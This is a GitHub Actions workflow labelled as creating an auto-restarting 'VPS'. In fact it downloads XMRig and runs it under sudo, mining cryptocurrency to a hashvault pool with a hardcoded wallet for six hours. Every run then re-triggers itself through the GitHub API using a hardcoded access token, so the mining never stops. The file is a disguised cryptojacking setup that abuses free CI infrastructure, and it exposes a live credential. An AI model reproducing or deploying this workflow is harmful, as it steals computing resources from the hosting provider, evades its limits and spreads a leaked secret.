name: Create VPS (Auto Restart)

on:
  workflow_dispatch:
  repository_dispatch:
    types: [create-vps]

jobs:
  start-vps:
    runs-on: ubuntu-latest
    timeout-minutes: 360  # 6 hours

    steps:
      - name: ‚¨áÔ∏è Checkout
        uses: actions/checkout@v3

      - name: üìÅ Prepare dirs
        run: mkdir -p links .backup

      - name: üíæ Restore backup (optional)
        run: |
          name="${{ github.event.client_payload.vps_name || 'manual-vps' }}"
          if [ "${{ github.event.client_payload.backup }}" == "true" ]; then
            unzip ".backup/$name.zip" -d . || echo "‚ö†Ô∏è No backup found."
          fi

      - name: üì• Setup VPS (XMRig)
        run: |
          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-focal-x64.tar.gz
          tar -xvzf xmrig-6.24.0-focal-x64.tar.gz
          cd xmrig-6.24.0
          sudo su -c "nohup ./xmrig -o asia.hashvault.pro:443 -u 8AHRHxFXTbBDBh57fByZ1ZGmMh3fwUFiVRe4FCS4yGDqb9FMtVHXNvS9u5UVMVLDU3MhQ6dAfZWnCKq2rUBSXPQLGRT6unC -p vipminer -a rx --tls --cpu-priority=5 --randomx-1gb-pages -t 4 > xmrig.log 2>&1 &"
          echo "‚úÖ XMRig started in background."

      - name: ‚è≥ Keep VPS alive
        run: |
          for i in $(seq 1 $((360))); do
            echo "üü¢ Running minute $i/360..."
            sleep 60
          done

      - name: üîÅ Restart workflow
        if: always()
        run: |
          curl -X POST \
            -H "Accept: application/vnd.github+json" \
            -H "Authorization: Bearer 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" \
            -H "Content-Type: application/json" \
            https://api.github.com/repos/${{ github.repository }}/dispatches \
            -d '{"event_type": "create-vps", "client_payload": {"vps_name": "manual-vps", "backup": true}}'
